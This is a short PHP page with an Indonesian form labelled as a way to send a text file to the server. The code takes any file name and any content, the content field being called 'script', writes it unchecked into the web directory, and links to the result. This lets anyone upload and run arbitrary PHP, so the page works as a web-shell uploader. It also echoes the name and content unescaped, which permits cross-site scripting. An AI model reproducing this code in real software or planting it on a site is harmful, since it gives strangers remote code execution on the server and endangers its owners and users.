<h1>Kirim file teks ke Server</h1>
<form method="post">
Nama file: <input type="text" name="namafile" required><br>
Konten: <textarea name="script" required></textarea><br>
<input type="submit" name="submit" value="submit">
</form>
<?php
if(isset($_REQUEST["script"]) and isset($_REQUEST["namafile"])){
 $namafile = time().$_REQUEST["namafile"];
 $konten = $_REQUEST["script"];
 $f = fopen($namafile,"w");
 if (fwrite($f,$konten)){
     echo "sukses\n";
     echo "<a href='$namafile'>$namafile</a>";
 }
 else{
     echo "gagal";
 }
 fclose($f);
}

?>
